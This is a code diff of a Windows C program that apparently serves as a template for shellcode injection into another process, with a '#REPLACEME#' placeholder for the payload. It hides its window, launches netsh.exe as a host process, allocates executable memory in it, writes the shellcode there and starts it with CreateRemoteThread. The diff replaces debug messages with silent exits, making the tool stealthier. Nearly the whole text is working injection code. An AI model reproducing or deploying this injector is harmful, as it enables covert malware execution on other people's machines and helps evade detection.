@@ -1,9 +1,6 @@
 #define WINVER 0x0501
 
-#include<stdio.h>
 #include<windows.h>
-#include<tlhelp32.h>
-#include<string.h>
 
 #REPLACEME#
 
@@ -18,18 +15,18 @@ int main(int argc, char *argv[])
     si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi= {0};
 
-    BOOL bSuccess = FALSE;
-    DWORD dwPid = 0;
-    bSuccess = CreateProcess(NULL, "C:\\Windows\\system32\\netsh.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-	if (bSuccess)
-	{
-		dwPid = GetProcessId(pi.hProcess);
-	}
 	if (x > 0)
 	{
 		pump(x);
 	} else {
-		pump(dwPid);
+		BOOL bSuccess = FALSE;
+		DWORD dwPid = 0;
+		bSuccess = CreateProcess(NULL, "C:\\Windows\\system32\\netsh.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+		if (bSuccess)
+		{
+			dwPid = GetProcessId(pi.hProcess);
+			pump(dwPid);
+		}
 	}
 	return 0;
 }
@@ -41,26 +38,19 @@ void pump(DWORD dwProcessID) {
 	PVOID pRemoteBuffer;
 
 	if(!dwProcessID) {
-		printf("No ProcessID Passed");
+		exit(0);
 	}
 	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
 	if(!hProc) {
-		printf("Cannot OP");
+		exit(0);
 	}
-
 	pRemoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(sc)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!pRemoteBuffer) {
-		printf("Error: VA");
+		exit(0);
 	}
 	if (!WriteProcessMemory(hProc, pRemoteBuffer, sc, sizeof(sc), NULL)) {
-		printf("Error: WPM");
+		exit(0);
 	}
-
-	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
-	if (!hRemoteThread) {
-		printf("Error: CRT");
-	}
+	CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
 	CloseHandle(hProc);
-
-	printf("DONE");
 }
